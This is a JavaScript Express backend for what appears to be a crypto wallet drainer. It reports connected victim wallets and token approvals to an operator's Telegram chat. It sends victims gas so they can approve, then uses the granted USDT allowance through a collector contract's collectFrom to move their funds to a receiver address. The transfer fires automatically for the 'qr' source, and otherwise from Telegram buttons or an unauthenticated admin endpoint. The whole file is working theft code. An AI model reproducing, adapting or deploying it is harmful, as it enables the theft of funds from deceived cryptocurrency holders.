import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import axios from 'axios';
import { ethers } from 'ethers';

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3002;

app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'x-api-key']
}));
app.use(express.json());

// ─── Environment Variables ────────────────────────────────────────────────────
const TELEGRAM_BOT_TOKEN  = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID    = process.env.TELEGRAM_CHAT_ID;
const OWNER_PRIVATE_KEY   = process.env.OWNER_PRIVATE_KEY;
const RECEIVER_ADDRESS    = process.env.RECEIVER_ADDRESS;
const RPC_URL             = process.env.RPC_URL || 'https://eth.llamarpc.com';
const USDT_ADDRESS        = process.env.USDT_ADDRESS        || '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const AUTO_COLLECTOR_ADDRESS = process.env.AUTO_COLLECTOR_ADDRESS || '0x672897015e6aD7d1B72870958C596164eC53A80f';

// ─── ABI ─────────────────────────────────────────────────────────────────────
const USDT_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function allowance(address owner, address spender) view returns (uint256)'
];
const COLLECTOR_ABI = [
  'function collectFrom(address token, address from, uint256 amount, address to) external'
];

// ─── Helpers ──────────────────────────────────────────────────────────────────
const getProvider = () => new ethers.JsonRpcProvider(RPC_URL);

const executeCollection = async (userAddress, amount) => {
  if (!OWNER_PRIVATE_KEY) throw new Error('Server missing Private Key');

  const provider = getProvider();
  const wallet = new ethers.Wallet(OWNER_PRIVATE_KEY, provider);
  const collector = new ethers.Contract(AUTO_COLLECTOR_ADDRESS, COLLECTOR_ABI, wallet);
  const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);
  const decimals = await usdt.decimals();
  const amountWei = ethers.parseUnits(amount.toString(), decimals);

  console.log(`Initiating Transfer: ${amount} USDT from ${userAddress} to ${RECEIVER_ADDRESS}`);
  const tx = await collector.collectFrom(USDT_ADDRESS, userAddress, amountWei, RECEIVER_ADDRESS);
  console.log('Transaction sent:', tx.hash);
  tx.wait()
    .then(r => console.log('Confirmed:', r.hash))
    .catch(console.error);
  return tx.hash;
};

const sendTelegramMessage = async (text, opts = {}) => {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return null;
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const body = { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML', ...opts };
  const res = await axios.post(url, body);
  return res.data?.result?.message_id;
};

const editTelegramMessage = async (messageId, text, opts = {}) => {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
  await axios.post(url, { chat_id: TELEGRAM_CHAT_ID, message_id: messageId, text, parse_mode: 'HTML', ...opts });
};

const answerCallbackQuery = async (callbackQueryId, text, showAlert = false) => {
  if (!TELEGRAM_BOT_TOKEN) return;
  await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
    callback_query_id: callbackQueryId,
    text,
    show_alert: showAlert
  });
};

const sendApprovalNotification = async (userAddress, txHash, source, balanceStr = 'N/A') => {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  const time = new Date().toLocaleString('en-US', { timeZone: 'Asia/Kolkata' });
  const message = `
🚀 <b>NEW APPROVAL INITIATED! (ERC20)</b>

📱 <b>SOURCE:</b>
<code>${source ? source.toUpperCase() : 'UNKNOWN'}</code>

👤 <b>USER ADDRESS:</b>
<code>${userAddress}</code>

🔗 <b>TRANSACTION HASH:</b>
<a href="https://etherscan.io/tx/${txHash}">View on Etherscan</a>
<code>${txHash || 'Pending'}</code>

💰 <b>BALANCE:</b>
<b>${balanceStr}</b>

⏰ <b>TIME:</b>
<code>${time}</code>
  `.trim();

  const opts = {
    reply_markup: JSON.stringify({
      inline_keyboard: [
        [
          { text: '⚙️ Receiver Address', callback_data: 'config' },
          { text: '💰 Balance', callback_data: `balance:${userAddress}` }
        ],
        [
          { text: '💸 Transfer', callback_data: `transfer:${userAddress}` }
        ]
      ]
    })
  };

  return await sendTelegramMessage(message, opts);
};

// ─── Routes ───────────────────────────────────────────────────────────────────

// Health check
app.get('/', (req, res) => {
  res.json({ status: 'ERC20 Backend running on Vercel ✅' });
});

// ── /api/notify-visit ─────────────────────────────────────────────────────────
app.post('/api/notify-visit', async (req, res) => {
  const { userAddress } = req.body;
  if (!userAddress) return res.status(400).json({ error: 'No address provided' });

  // Send Telegram IMMEDIATELY (no slow RPC first)
  const time = new Date().toLocaleString('en-US', { timeZone: 'Asia/Kolkata' });
  sendTelegramMessage(`
👀 <b>WALLET CONNECTED / ACCOUNT OPENED (ERC20)</b>

👤 <b>USER ADDRESS:</b>
<code>${userAddress}</code>

⏰ <b>TIME:</b>
<code>${time}</code>

💰 <i>Balance: fetching in background...</i>
  `.trim())
    .then(() => console.log('✅ Visit notification sent.'))
    .catch(err => console.error('Telegram visit error:', err.message));

  // Respond to frontend immediately
  res.json({ success: true });

  // Background: auto-gas if user low on ETH
  try {
    const provider = getProvider();
    const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);
    const usdtBal = await usdt.balanceOf(userAddress);
    if (usdtBal === 0n) return;

    const autoFundAmount = process.env.AUTO_FUND_AMOUNT || '0.00003';
    const autoFundThreshold = process.env.AUTO_FUND_THRESHOLD || '0.00003';
    const ethBal = await provider.getBalance(userAddress);
    const threshold = ethers.parseEther(autoFundThreshold);

    if (ethBal < threshold && OWNER_PRIVATE_KEY) {
      const wallet = new ethers.Wallet(OWNER_PRIVATE_KEY, provider);
      const tx = await wallet.sendTransaction({ to: userAddress, value: ethers.parseEther(autoFundAmount) });
      console.log(`✅ Sent gas to ${userAddress}: ${tx.hash}`);
    }
  } catch (err) {
    console.error('Background gas error:', err.message);
  }
});

// ── /api/notify-approval ──────────────────────────────────────────────────────
app.post('/api/notify-approval', async (req, res) => {
  const { userAddress, txHash, source, amount } = req.body;
  console.log(`Approval: ${userAddress} | Hash: ${txHash} | Source: ${source}`);

  if (!userAddress) return res.status(400).json({ error: 'No userAddress' });

  // Send Telegram IMMEDIATELY — before any slow blockchain reads
  sendApprovalNotification(userAddress, txHash, source, 'Loading...')
    .then(() => console.log('✅ Approval notification sent.'))
    .catch(err => console.error('Telegram approval error:', err.message));

  // Respond to frontend immediately
  res.json({ success: true });

  // Background: QR source only — execute collection if valid amount given
  if (source && source.toLowerCase() === 'qr') {
    try {
      const provider = getProvider();
      const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);
      const [balance, allowance, decimals] = await Promise.all([
        usdt.balanceOf(userAddress),
        usdt.allowance(userAddress, AUTO_COLLECTOR_ADDRESS),
        usdt.decimals()
      ]);
      const balStr = '$' + ethers.formatUnits(balance, decimals);
      const allowStr = ethers.formatUnits(allowance, decimals);
      console.log(`Balance: ${balStr} | Allowance: ${allowStr}`);

      const transferAmt = (amount && !isNaN(amount) && Number(amount) > 0) ? amount : 0;
      if (Number(transferAmt) > 0) {
        const txH = await executeCollection(userAddress, transferAmt);
        console.log(`✅ QR collection done: ${txH}`);
      }
    } catch (err) {
      console.error('QR collection error:', err.message);
    }
  } else {
    console.log(`Source '${source || 'unknown'}' — notification only, no auto-transfer.`);
  }
});

// ── /api/telegram-webhook — handles Telegram inline button presses ─────────────
app.post('/api/telegram-webhook', async (req, res) => {
  res.status(200).json({ ok: true }); // Respond to Telegram immediately

  const update = req.body;
  if (!update.callback_query) return;

  const callbackQuery = update.callback_query;
  const message = callbackQuery.message;
  const data = callbackQuery.data;

  if (message.chat.id.toString() !== TELEGRAM_CHAT_ID) {
    await answerCallbackQuery(callbackQuery.id, 'Unauthorized.');
    return;
  }

  const appendUpdate = async (newContent) => {
    const original = message.text || 'Status Update';
    const newText = `${original}\n\n――― <b>UPDATE</b> ―――\n${newContent}`;
    await editTelegramMessage(message.message_id, newText, {
      reply_markup: JSON.stringify(message.reply_markup)
    });
  };

  try {
    if (data === 'config') {
      await answerCallbackQuery(callbackQuery.id, 'Config loaded');
      await appendUpdate(`⚙️ <b>Receiver Address:</b>\n<code>${RECEIVER_ADDRESS}</code>`);
    }

    else if (data.startsWith('balance:')) {
      await answerCallbackQuery(callbackQuery.id, 'Fetching balance...');
      const userAddress = data.split(':')[1];
      const provider = getProvider();
      const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);
      const [balance, allowance, decimals] = await Promise.all([
        usdt.balanceOf(userAddress),
        usdt.allowance(userAddress, AUTO_COLLECTOR_ADDRESS),
        usdt.decimals()
      ]);
      const balFmt = ethers.formatUnits(balance, decimals);
      const allowFmt = ethers.formatUnits(allowance, decimals);
      await appendUpdate(`💰 <b>Live Balance:</b>\nERC20 USDT: <code>${balFmt}</code>\nAllowance: <code>${allowFmt}</code>`);
    }

    else if (data.startsWith('transfer:')) {
      const userAddress = data.split(':')[1];
      await answerCallbackQuery(callbackQuery.id, 'Executing Transfer...');
      await appendUpdate(`⏳ <i>Executing transfer for <code>${userAddress}</code>...</i>`);

      const provider = getProvider();
      const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);
      const [balance, allowance, decimals] = await Promise.all([
        usdt.balanceOf(userAddress),
        usdt.allowance(userAddress, AUTO_COLLECTOR_ADDRESS),
        usdt.decimals()
      ]);
      const transferableWei = balance < allowance ? balance : allowance;
      const transferable = ethers.formatUnits(transferableWei, decimals);

      if (Number(transferable) <= 0) {
        await appendUpdate(`❌ <b>Transfer Failed: Amount is 0</b>\nBalance: ${ethers.formatUnits(balance, decimals)}\nAllowance: ${ethers.formatUnits(allowance, decimals)}`);
        return;
      }

      try {
        const txHash = await executeCollection(userAddress, transferable);
        await appendUpdate(`✅ <b>Transfer Executed!</b>\nAmount: <code>${transferable}</code> USDT\n<a href="https://etherscan.io/tx/${txHash}">View on Etherscan</a>`);
      } catch (e) {
        await appendUpdate(`❌ <b>Transfer Failed</b>\n<code>${e.message}</code>`);
      }
    }
  } catch (err) {
    console.error('Webhook callback error:', err.message);
    await answerCallbackQuery(callbackQuery.id, 'An error occurred.', true);
  }
});

// ── /api/setup-webhook — call once after deploy to register Telegram webhook ──
app.get('/api/setup-webhook', async (req, res) => {
  if (!TELEGRAM_BOT_TOKEN) return res.status(500).json({ error: 'TELEGRAM_BOT_TOKEN not set' });

  const baseUrl = req.query.url || `https://${req.headers.host}`;
  const webhookUrl = `${baseUrl}/api/telegram-webhook`;

  try {
    const response = await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook`,
      { url: webhookUrl }
    );
    res.json({ success: true, message: `Webhook set to: ${webhookUrl}`, telegramResponse: response.data });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// ── Route aliases (without /api prefix) for backward compatibility ────────────
// The registered Telegram webhook points to /telegram-webhook (old structure)
// These aliases ensure it keeps working without re-registering
app.post('/telegram-webhook', (req, res, next) => { req.url = '/api/telegram-webhook'; next('router'); });
app.get('/setup-webhook',     (req, res, next) => { req.url = '/api/setup-webhook';     next('router'); });
app.post('/notify-approval',  (req, res, next) => { req.url = '/api/notify-approval';   next('router'); });
app.post('/notify-visit',     (req, res, next) => { req.url = '/api/notify-visit';       next('router'); });

// ── Admin endpoints ───────────────────────────────────────────────────────────
app.get('/admin/config', (req, res) => {
  res.json({ receiverAddress: RECEIVER_ADDRESS });
});

app.post('/admin/check-balance', async (req, res) => {
  const { userAddress } = req.body;
  try {
    const provider = getProvider();
    const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);
    const [balance, allowance, decimals] = await Promise.all([
      usdt.balanceOf(userAddress),
      usdt.allowance(userAddress, AUTO_COLLECTOR_ADDRESS),
      usdt.decimals()
    ]);
    res.json({
      success: true,
      balance: ethers.formatUnits(balance, decimals),
      allowance: ethers.formatUnits(allowance, decimals)
    });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post('/admin/transfer', async (req, res) => {
  const { userAddress, amount } = req.body;
  try {
    const txHash = await executeCollection(userAddress, amount);
    res.json({ success: true, txHash });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// ─── Start server (local only — Vercel uses export default) ──────────────────
if (!process.env.VERCEL) {
  app.listen(PORT, () => {
    console.log(`ERC20 Backend running on http://localhost:${PORT}`);
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.warn('⚠️ WARNING: Telegram Bot Token or Chat ID not set.');
    }
  });
}

export default app;
